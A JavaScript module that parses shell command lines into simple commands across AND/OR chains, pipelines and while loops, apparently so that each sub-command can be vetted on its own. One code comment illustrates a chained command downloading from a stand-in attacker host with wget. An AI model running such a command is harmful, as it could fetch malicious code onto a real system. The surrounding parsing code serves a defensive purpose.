import { _ } from 'golgoth';
import { parse } from 'unbash';

export let __;

/**
 * Extract all simple commands from a command line
 * @param {string} commandLine - The command line to parse
 * @returns {Array<string>} Array of simple commands
 */
export function extractSimpleCommands(commandLine) {
  const ast = parse(commandLine);

  return _.chain(ast.commands)
    .map((statement) => __.extractFromNode(commandLine, statement.command))
    .flatten()
    .thru((commands) => (commands.length > 0 ? commands : [commandLine]))
    .value();
}

__ = {
  /**
   * Extract command text from a node
   * @param {string} commandLine - The full command line
   * @param {object} node - The AST node to extract from
   * @returns {string|Array<string>} The command text or array of commands
   */
  extractFromNode(commandLine, node) {
    // while true; do echo hello; done
    if (node.type === 'While') {
      return __.extractFromWhile(commandLine, node);
    }

    // echo hello && wget evil.com
    if (node.type === 'AndOr' || node.type === 'Pipeline') {
      return _.chain(node.commands)
        .map((subCommand) => __.extractFromNode(commandLine, subCommand))
        .flatten()
        .value();
    }

    // echo hello (Command node)
    return commandLine.substring(node.name.pos, node.end);
  },
  /**
   * Extract commands from a While loop
   * Example: while true; do echo hello; done
   * @param {string} commandLine - The full command line
   * @param {object} whileNode - The While node from AST
   * @returns {Array<string>} Array of commands from clause and body
   */
  extractFromWhile(commandLine, whileNode) {
    // Condition: true
    const clauseCommands = _.chain(whileNode.clause.commands)
      .map((statement) => __.extractFromNode(commandLine, statement.command))
      .flatten()
      .filter((cmd) => !cmd.startsWith('['))
      .value();

    // Body: echo hello
    const bodyCommands = _.chain(whileNode.body.commands)
      .map((statement) => __.extractFromNode(commandLine, statement.command))
      .flatten()
      .value();

    return [...clauseCommands, ...bodyCommands];
  },
};
